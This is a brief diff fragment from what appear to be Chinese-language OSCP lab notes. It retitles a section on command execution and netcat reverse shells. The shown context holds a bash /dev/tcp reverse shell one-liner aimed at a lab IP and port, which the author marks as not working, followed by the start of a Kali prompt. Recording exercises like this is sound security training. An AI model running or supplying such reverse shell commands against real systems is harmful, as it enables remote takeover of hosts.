@@ -56,7 +56,7 @@ print(output_text)
 
 ```
 
-# 反弹SHELL
+# 命令执行nc反弹SHELL
 sh -i >& /dev/tcp/ 192.168.44.128 / 9001 0>&1不行
 ```C
 ┌──(kali㉿kali)-[~/桌面/OSCP]
